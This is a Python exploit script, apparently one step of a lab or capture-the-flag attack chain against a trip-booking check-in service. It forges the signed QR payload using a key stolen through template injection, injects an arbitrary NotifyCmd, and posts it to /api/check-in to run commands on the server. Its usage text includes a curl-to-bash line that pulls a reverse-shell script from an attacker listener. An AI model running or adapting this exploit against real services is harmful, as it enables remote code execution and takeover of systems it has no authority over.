#!/usr/bin/env python3
"""Rewrite NotifyCmd in the check-in QR, re-HMAC, POST /api/check-in.

    export TICKET_VALIDATION_TOKEN=...   # from SSTI /proc/self/environ
    python3 03-checkin-rce.py --cmd 'id'
    python3 03-checkin-rce.py --cmd 'curl -s http://LHOST:8888/rev.sh | bash'
"""
from __future__ import annotations

import argparse
import json
import os
import re
import subprocess
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from lib import base_url, opener, req, save_jar  # noqa: E402

HERE = Path(__file__).resolve().parent


def extract_json(b64: str) -> dict:
    import base64
    raw = base64.b64decode(b64)
    m = re.search(rb"\{.*\}", raw)
    if not m:
        raise SystemExit("no JSON in qr_data")
    return json.loads(m.group())


def forge(js: str, key: str) -> str:
    r = subprocess.run(
        ["go", "run", ".", js, key],
        cwd=str(HERE),
        check=True,
        capture_output=True,
        text=True,
    )
    out = r.stdout.strip()
    if not out:
        raise SystemExit(f"forge empty stderr={r.stderr}")
    return out


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--cmd", required=True, help="NotifyCmd to execute as www-data")
    ap.add_argument("--key", default=os.environ.get("TICKET_VALIDATION_TOKEN", ""))
    ap.add_argument("--timeout", type=int, default=25)
    args = ap.parse_args()
    if not args.key:
        raise SystemExit("set TICKET_VALIDATION_TOKEN or --key")

    base = base_url()
    o = opener()
    _, _, body = req(o, "GET", f"{base}/partials/check-in")
    html = body.decode("utf-8", "replace")
    m = re.search(r'name="qr_data" value="([^"]+)"', html)
    if not m:
        raise SystemExit("no qr_data — book a trip and stay before departure")
    obj = extract_json(m.group(1))
    obj["NotifyCmd"] = args.cmd
    # separators match the app (no spaces) so a self-check against the
    # original blob is possible before you change NotifyCmd
    js = json.dumps(obj, separators=(",", ":"))
    print(f"[*] json {js}")
    b64 = forge(js, args.key)
    print(f"[*] forged {len(b64)} b64 chars")
    st, hdr, resp = req(
        o, "POST", f"{base}/api/check-in",
        {"qr_data": b64, "gate": "WEB"},
        timeout=args.timeout,
    )
    save_jar(o)
    loc = hdr.get("Location") or hdr.get("location") or ""
    print(f"[+] {st} {loc}")
    sys.stdout.buffer.write(resp[:4000])
    print()


if __name__ == "__main__":
    main()
